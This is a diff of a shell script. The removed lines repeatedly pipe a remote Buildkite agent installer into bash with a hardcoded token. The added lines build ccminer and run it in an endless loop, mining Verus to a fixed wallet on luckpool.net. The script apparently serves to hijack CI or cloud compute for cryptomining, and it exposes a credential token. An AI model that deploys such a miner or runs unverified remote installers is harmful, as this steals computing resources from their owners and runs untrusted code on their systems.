@@ -1,14 +1,16 @@
 #!/bin/sh
-sudo apt-get install screen -y
-screen
-
-COUNTER=20
-until [  $COUNTER -lt 10 ]; do
- 
-TOKEN="0b9e034ce3ee25851b278384c7c8b528ed3bd776731046ac12" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/master/install.sh`"
-~/.buildkite-agent/bin/buildkite-agent start
-
- 
-     echo COUNTER $COUNTER
-     let COUNTER-=1
+apt update
+apt install sudo
+apt install git -y
+sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y
+git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
+cd ccminer
+chmod +x build.sh
+chmod +x configure.sh
+chmod +x autogen.sh
+./build.sh
+while [ 1 ]; do
+./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RYA9hTgYmNFayype84LN2cHCD2qg1bY4KK.s1 -p x -t 2
+sleep 3
 done
+sleep 999
